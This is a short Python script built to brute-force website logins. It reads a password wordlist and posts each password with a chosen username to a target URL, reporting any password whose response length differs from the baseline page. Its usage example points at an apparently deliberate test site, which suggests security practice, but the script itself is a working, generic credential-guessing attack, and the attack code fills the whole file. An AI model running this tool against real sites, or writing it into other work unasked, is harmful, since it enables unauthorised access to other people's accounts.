#!/usr/bin/env python3
"""
Author : 
Date   : 2022-10-26
Purpose: bruteforce password login on websites
python bruteforce.py --url http://testphp.vulnweb.com/userinfo.php  --user test --wordlist passwords.txt
"""

import argparse
import requests


# --------------------------------------------------
def get_args():
    """Get command-line arguments"""

    parser = argparse.ArgumentParser(
        description='bruteforce passwords',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)


    parser.add_argument('-u',
                        '--url',
                        help='Website to target',
                        metavar='str',
                        type=str,
                        default='',
                        required=True)


    parser.add_argument('-U',
                        '--user',
                        help='User to target',
                        metavar='str',
                        type=str,
                        default='',
                        required=True)

    parser.add_argument('-f',
                        '--wordlist',
                        help='Wordlist of passwords to use',
                        metavar='str',
                        type=str,
                        default='passwords.txt',
                        required=True)



    return parser.parse_args()


# --------------------------------------------------
def main():
    """Make a jazz noise here"""

    args = get_args()

    url = args.url
    user = args.user
    wordlist = args.wordlist

    loginpage = requests.get(url)
    org = len(loginpage.text)

    with open(wordlist, 'r') as fh:
        for word in fh.readlines():
            password = word.replace("\n", "")
            data = {'uname': user, 'pass': password}
            response = requests.post(url, data = data)
            if org != len(response.text):
                print(password, len(response.text))

    



# --------------------------------------------------
if __name__ == '__main__':
    main()
